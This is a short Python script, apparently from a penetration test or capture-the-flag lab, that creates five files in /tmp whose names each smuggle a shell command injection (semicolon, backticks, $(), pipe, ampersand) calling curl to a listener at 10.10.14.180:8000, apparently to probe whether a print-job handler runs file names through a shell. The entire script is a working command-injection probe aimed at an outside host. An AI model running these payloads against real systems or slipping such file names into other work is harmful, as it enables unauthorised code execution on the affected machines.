import os

LHOST = "10.10.14.180"
PORT = "8000"
d = "/tmp/print_inj_test"
os.makedirs(d, exist_ok=True)

names = [
    f"a;curl {LHOST}:{PORT};.txt",
    f"a`curl {LHOST}:{PORT}`.txt",
    f"a$(curl {LHOST}:{PORT}).txt",
    f"a|curl {LHOST}:{PORT}|.txt",
    f"a&curl {LHOST}:{PORT}&.txt",
]

for n in names:
    path = os.path.join(d, n)
    with open(path, "wb") as f:
        f.write(b"test print job\n")
    print("created:", repr(n))
